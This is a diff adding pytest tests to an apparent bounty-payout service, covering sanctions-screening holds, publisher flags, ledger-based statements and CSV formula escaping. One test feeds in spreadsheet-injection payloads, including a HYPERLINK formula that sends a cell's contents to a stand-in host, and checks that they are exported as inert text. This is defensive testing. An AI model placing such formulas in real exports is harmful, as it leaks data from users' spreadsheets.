@@ -6,6 +6,7 @@ from __future__ import annotations
 import csv
 import io
 from datetime import UTC, datetime, timedelta
+from decimal import Decimal
 
 import pytest
 from fastapi.testclient import TestClient
@@ -14,6 +15,7 @@ from misthos.domain.compliance import (
     PAYOUT_RETRY_INTERVAL,
     RESCREEN_INTERVAL,
     SCREENING_RETENTION,
+    ComplianceRefusal,
     PartyKind,
     Screening,
     ScreeningOutcome,
@@ -22,6 +24,7 @@ from misthos.domain.compliance import (
 from misthos.domain.issue import SILENT_PUBLISHER_GRACE, IssueState
 from misthos.main import app
 from misthos.models.records import IssueRecord
+from misthos.schemas import PublishRequest
 from misthos.services.compliance import SimulatedIdentity, SimulatedScreening
 from misthos.services.statements import annual_statement, to_csv
 from misthos.store import store
@@ -190,6 +193,87 @@ class TestContinuousScreening:
         assert claimed.state is IssueState.CLAIMED
         assert actions(claimed).count("counterparty_flagged") == 1
 
+    def test_a_sanctions_hold_says_it_is_screened_again_and_releases_on_its_own(self) -> None:
+        """No person clears a sanctions hold: the retry does, once the wallet is off the
+        list. The decision log says so, and the release proves it."""
+        store.screening.list_wallet(wallet("CON-2"))  # type: ignore[attr-defined]
+        held = run_to_merge("ISS-1002")
+        line = held.decisions[-1]
+
+        assert (line.action, line.rule) == ("payout_held", "sanctions_screening")
+        assert PAYOUT_RETRY_INTERVAL == timedelta(hours=1)
+        assert "screened again every hour" in line.outcome
+        assert "released once the wallet is no longer listed" in line.outcome
+        assert "compliance reviews" not in line.outcome
+
+        store.screening.delist_wallet(wallet("CON-2"))  # type: ignore[attr-defined]
+        assert held.payout_checked_at is not None
+        sweep_once(store, now=held.payout_checked_at + LATER)
+        assert get("ISS-1002").state is IssueState.PAID
+
+    def flag(self, party: str, address: str) -> None:
+        """Screen every live party once, list `address`, and screen again a day later,
+        which is when the sweeper writes the flag."""
+        now = datetime.now(UTC)
+        store.rescreen(now)
+        store.screening.list_wallet(address)  # type: ignore[attr-defined]
+        assert (party, ScreeningOutcome.HIT) in {
+            (s.party_id, s.outcome) for s in store.rescreen(now + RESCREEN_INTERVAL)
+        }
+
+    @staticmethod
+    def flagged(issue_id: str) -> str:
+        [line] = [d for d in get(issue_id).decisions if d.action == "counterparty_flagged"]
+        return line.outcome
+
+    def test_a_listed_contributor_is_flagged_for_the_payout_it_stops(self) -> None:
+        self.flag("CON-1", wallet("CON-1"))
+
+        line = self.flagged("ISS-1003")  # CON-1 holds the claim
+        assert "the contributor CON-1 is now on" in line
+        assert "no payout is released to them while their wallet is listed" in line
+
+        held = run_to_merge("ISS-1003")
+        assert held.state is IssueState.ACCEPTED
+        assert held.payout_hold == "blocked_sanctions" and held.paid is None
+
+    def test_a_listed_publisher_is_flagged_for_what_it_stops_and_nothing_more(self) -> None:
+        """A publisher is screened at the first commitment, not at payout, so the line
+        on its open issues must not promise that their money stops."""
+        publisher = store.get_publisher("PUB-1")
+        assert publisher is not None
+        self.flag("PUB-1", publisher.wallet.address)
+
+        line = self.flagged("ISS-1002")
+        assert "the publisher PUB-1 is now on" in line
+        assert "new commitments from them are refused while their wallet is listed" in line
+        assert "the money already committed here is not held" in line
+        assert "no money moves" not in line
+
+    def test_what_the_publisher_line_says_is_what_happens(self) -> None:
+        publisher = store.get_publisher("PUB-1")
+        assert publisher is not None
+        self.flag("PUB-1", publisher.wallet.address)
+
+        # What is committed is not held: accepted work is paid...
+        paid = run_to_merge("ISS-1002")
+        assert paid.state is IssueState.PAID and paid.payout_tx_hash is not None
+        # ...and an unworked commitment goes back to the publisher at its deadline.
+        funded = get("ISS-1001")
+        assert funded.state is IssueState.FUNDED and funded.deadline is not None
+        sweep_once(store, now=funded.deadline + timedelta(minutes=1))
+        assert get("ISS-1001").state is IssueState.REFUNDED
+        # What is refused is a new commitment.
+        fresh = store.publish(
+            PublishRequest(
+                repo="acme/ledger", title="Round half-even", publisher_id="PUB-1",
+                signals={"blast_radius": 2},
+            )
+        )  # fmt: skip
+        with pytest.raises(ComplianceRefusal):
+            store.advance(fresh.id)
+        assert get(fresh.id).escrow is None
+
     def test_a_listed_publisher_cannot_commit_funds(self, client: TestClient) -> None:
         awaiting = get("ISS-1006")
         publisher = store.get_publisher(awaiting.publisher_id)
@@ -263,6 +347,49 @@ class TestStatements:
         assert header[:3] == ["paid_at_utc", "issue_id", "repo"]
         assert line[1] == "ISS-1004" and line[8] == "USDC"
         assert total[0] == "TOTAL" and total[7] == line[7]
+
+    def test_a_payout_is_on_the_statement_whatever_state_the_issue_shows(self) -> None:
+        """The statement reports the ledger. A release the ledger recorded is a payout,
+        even where the issue's mirrored state says otherwise."""
+        year = self.paid_year("ISS-1004")
+        mirrored = get("ISS-1004")
+        mirrored.state = IssueState.ACCEPTED  # the mirror disagrees with the ledger
+        store.repo.save_issues(mirrored)
+
+        statement = annual_statement(store, "CON-3", year)
+
+        assert statement is not None
+        assert [line.issue_id for line in statement.lines] == ["ISS-1004"]
+        assert statement.total == statement.lines[0].amount
+
+    def test_a_formula_a_publisher_typed_is_exported_as_text(self) -> None:
+        """The title, the repository and the organisation's name are someone else's
+        words. A spreadsheet opening the statement shows them; it never runs them."""
+        title = '=HYPERLINK("http://x/?"&A1,"click")'
+        account = store.create_account("0x" + "ab" * 20, "publisher", "@SUM(A1:A9)")
+        published = store.publish(
+            PublishRequest(
+                repo="+evil/repo",
+                title=title,
+                publisher_id=account.party_id,
+                signals={"blast_radius": 2},
+            )
+        )
+        paid = store.approve_and_accept(published.id)
+        assert paid.state is IssueState.PAID
+        assert paid.paid_at is not None and paid.paid is not None
+        assert paid.contributor_id is not None
+
+        statement = annual_statement(store, paid.contributor_id, paid.paid_at.year)
+        assert statement is not None
+        rows = list(csv.reader(io.StringIO(to_csv(statement))))
+        line = next(row for row in rows if len(row) > 1 and row[1] == published.id)
+
+        assert line[2] == "'+evil/repo"
+        assert line[4] == "'" + title
+        assert line[6] == "'@SUM(A1:A9)"
+        # The amount is still a number an accountant can add up.
+        assert Decimal(line[7]) == round(paid.paid.decimal, 2)
 
     def test_the_api_serves_json_and_csv(self, client: TestClient) -> None:
         year = self.paid_year("ISS-1004")
